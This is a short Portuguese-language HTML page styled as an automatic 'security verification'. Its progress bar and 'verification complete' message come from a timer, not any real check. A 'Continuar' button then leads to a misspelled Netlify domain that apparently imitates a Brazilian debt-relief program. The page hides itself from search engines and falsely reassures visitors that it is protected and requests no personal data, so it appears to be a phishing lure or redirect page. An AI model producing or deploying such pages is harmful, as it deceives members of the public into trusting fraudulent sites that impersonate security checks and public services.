<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="noindex,nofollow" />
  <title>Verificação de Identidade - Segurança</title>
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    html,body{min-height:100%}
    body{
      min-height:100vh;
      display:flex;
      align-items:center;
      justify-content:center;
      padding:24px;
      font-family:Inter,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
      background:#f7f8fa;
      color:#202124;
    }
    .card{
      width:100%;
      max-width:520px;
      background:#fff;
      border:1px solid #e5e7eb;
      border-radius:18px;
      padding:42px 34px;
      text-align:center;
      box-shadow:0 14px 40px rgba(17,24,39,.08);
    }
    .shield{
      width:68px;
      height:68px;
      margin:0 auto 22px;
      display:grid;
      place-items:center;
      border-radius:50%;
      background:#f0f5ff;
    }
    .shield svg{width:34px;height:34px;fill:none;stroke:#2563eb;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
    h1{font-size:26px;line-height:1.2;font-weight:700;margin-bottom:12px}
    .lead{font-size:16px;color:#5f6368;margin-bottom:28px}
    .loader{
      width:44px;
      height:44px;
      margin:0 auto 22px;
      border:4px solid #e8edf5;
      border-top-color:#2563eb;
      border-radius:50%;
      animation:spin .9s linear infinite;
    }
    @keyframes spin{to{transform:rotate(360deg)}}
    .status{font-size:15px;color:#3c4043;font-weight:500;margin-bottom:10px}
    .substatus{font-size:13px;color:#80868b;line-height:1.5}
    .progress{
      height:6px;
      overflow:hidden;
      margin:26px auto 0;
      border-radius:999px;
      background:#edf0f4;
    }
    .progress span{
      display:block;
      width:0;
      height:100%;
      border-radius:inherit;
      background:#2563eb;
      transition:width 3.2s ease, background .3s ease;
    }
    .progress span.loading{width:100%}
    .progress span.done{background:#16a34a}
    .action-btn{
      display:none;
      align-items:center;
      justify-content:center;
      width:100%;
      margin-top:24px;
      padding:14px 22px;
      border:0;
      border-radius:10px;
      background:#2563eb;
      color:#fff;
      font-size:16px;
      font-weight:700;
      text-decoration:none;
      cursor:pointer;
      transition:background .2s ease,transform .2s ease;
    }
    .action-btn:hover{background:#1d4ed8;transform:translateY(-1px)}
    .action-btn:focus-visible{outline:3px solid rgba(37,99,235,.3);outline-offset:3px}
    .footer{margin-top:28px;font-size:12px;color:#9aa0a6}
    @media (max-width:520px){
      body{padding:16px;background:#fff}
      .card{border:0;box-shadow:none;padding:28px 18px}
      h1{font-size:23px}
    }
    @media (prefers-reduced-motion:reduce){
      .loader{animation:none}
      .progress span{transition:none}
    }
  </style>
</head>
<body>
  <main class="card" aria-live="polite">
    <div class="shield" aria-hidden="true">
      <svg viewBox="0 0 24 24">
        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
        <path d="m9 12 2 2 4-4"></path>
      </svg>
    </div>

    <h1>Verificação de Segurança</h1>
    <p class="lead">Protegendo sua navegação...</p>

    <div class="loader" role="status" aria-label="Verificando"></div>

    <p class="status" id="status">Validando sua conexão com segurança...</p>
    <p class="substatus">Este processo é automático e não solicita informações pessoais.</p>

    <div class="progress" aria-hidden="true"><span id="progressBar"></span></div>

    <a class="action-btn" href="https://desenrolar-2026-brasill.netlify.app/" id="continueBtn">Continuar</a>

    <div class="footer">Ambiente protegido • Conexão segura</div>
  </main>

  <script>
    const status = document.getElementById('status');
    const progressBar = document.getElementById('progressBar');
    const continueBtn = document.getElementById('continueBtn');
    const loader = document.querySelector('.loader');

    requestAnimationFrame(() => progressBar.classList.add('loading'));

    setTimeout(() => {
      progressBar.classList.add('done');
      status.textContent = 'Verificação concluída com sucesso!';
      loader.style.display = 'none';
      continueBtn.style.display = 'inline-flex';
    }, 3300);

  </script>
</body>
</html>
